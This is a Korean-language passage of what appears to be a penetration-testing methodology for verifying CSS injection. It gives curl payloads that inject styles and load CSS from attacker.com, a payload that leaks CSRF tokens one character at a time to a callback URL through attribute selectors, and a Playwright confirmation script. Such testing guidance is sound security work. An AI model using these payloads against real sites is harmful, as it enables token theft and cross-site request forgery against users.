### Phase 2: 동적 테스트 (검증)


**인라인 스타일 삽입 테스트:**
```
# 세미콜론으로 새 속성 추가
curl "https://target.com/profile?color=red%3B%20background-image%3A%20url(https%3A%2F%2Fattacker.com%2Fexfil)"

# 중괄호로 셀렉터 탈출
curl "https://target.com/profile?color=red%7D%20*%20%7B%20display%3Anone%20%7D%20.x%7B"
```

**`<style>` 태그 내 삽입 테스트:**
```
# @import로 외부 CSS 로드
curl "https://target.com/theme?color=red%7D%20%40import%20url(https%3A%2F%2Fattacker.com%2Fevil.css)%3B%20.x%7B"
```

**데이터 추출 (attribute selector 기반):**
```
# CSRF 토큰 1글자씩 추출 (외부 서버 필요)
curl "https://target.com/profile?color=red%7D%20input[name%3Dcsrf][value^%3Da]%7Bbackground:url(https://CALLBACK_URL/leak?char%3Da)%7D%20.x%7B"
```

**Playwright 테스트 (브라우저 렌더링 확인):**
```javascript
// CSS 삽입으로 시각적 변화 확인
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();

  // CSS 삽입 페이로드가 포함된 URL 로드
  await page.goto('https://target.com/profile?color=red%3B%20background-color%3A%20lime');

  // 대상 요소의 computed style 확인
  const bgColor = await page.evaluate(() => {
    const el = document.querySelector('[style*="color"]');
    return el ? getComputedStyle(el).backgroundColor : 'not found';
  });

  console.log('Background color:', bgColor);
  // 'rgb(0, 255, 0)' 이면 CSS 삽입 성공
  if (bgColor.includes('0, 255, 0') || bgColor.includes('lime')) {
    console.log('CONFIRMED: CSS injection successful');
  }

  // 외부 리소스 로드 시도 확인 (네트워크 모니터링)
  await page.goto('https://target.com/profile?color=red%7D*%7Bbackground:url(https://CALLBACK_URL/css-exfil)%7D.x%7B');
  await page.waitForTimeout(3000);

  await browser.close();
})();
```

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| curl 응답에서 CSS 구문이 이스케이프 없이 `<style>` 또는 `style=` 내에 반영 | 확인됨 (curl 기반) |
| Playwright에서 computed style이 주입한 값으로 변경 | 확인됨 (브라우저 기반) |
| 콜백 서비스에서 `url()` 요청 수신 | 확인됨 (외부 리소스 로드) |
| CSS 구문이 HTML 인코딩되어 반영 (`&#59;`, `&#123;`) | 안전 |
| CSS 구문이 제거/필터링되어 반영 | 안전 |
| CSP가 `style-src` 제한 + 인라인 스타일 차단 | 안전 (CSP 방어) |

**검증 기준:**
- **확인됨**: 동적 테스트로 CSS 구문이 삽입되어 스타일이 변경되거나 외부 리소스가 로드된 것을 직접 확인함
- **후보**: curl로 반영은 확인되지만 브라우저 렌더링이 필요한 경우, Playwright 테스트를 시도한다
